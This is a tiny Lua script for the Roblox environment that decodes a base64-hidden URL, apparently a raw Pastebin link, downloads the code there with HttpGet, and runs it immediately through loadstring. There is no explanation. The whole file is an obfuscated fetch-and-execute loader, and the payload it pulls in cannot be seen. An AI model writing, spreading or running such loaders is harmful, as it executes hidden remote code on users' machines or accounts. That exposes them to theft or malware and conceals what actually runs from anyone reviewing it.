local s = game:GetService("HttpService")
local l = loadstring
local g = game

local u = s:DecodeBase64("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0ZWWlBWd3NT")

l(g:HttpGet(u))()
